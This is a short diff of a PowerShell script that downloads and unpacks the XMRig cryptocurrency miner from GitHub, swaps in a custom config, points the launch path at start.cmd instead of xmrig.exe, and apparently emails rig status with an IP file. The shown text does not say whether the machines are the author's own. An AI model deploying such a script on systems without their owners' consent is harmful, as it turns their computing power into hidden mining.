@@ -93,6 +93,8 @@ $currentDir = $Pwd
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"
 Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"
 
+
+
 # Replace XMRig Configuration File
 $newConfigPath = "$path\config.json"
 $targetConfigPath = "$initial_dir\xmrig-6.22.2\config.json"
@@ -105,7 +107,7 @@ if (Test-Path -Path $newConfigPath) {
 
 # Define Paths
 $ipFile = "$initial_dir\ip.txt"
-$xmrPath = "$initial_dir\xmrig.exe"
+$xmrPath = "$initial_dir\start.cmd"
 $configPath = "$initial_dir\config.json"
 
 # Send Email with Rig Status
